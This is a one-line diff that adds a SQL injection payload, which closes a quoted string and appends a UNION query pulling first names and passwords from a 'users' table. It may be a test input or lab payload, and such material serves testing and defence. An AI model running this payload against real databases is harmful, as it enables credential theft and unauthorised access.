@@ -1,0 +1,1 @@
+' UNION (SELECT firstname, 1, 1, password FROM users)--
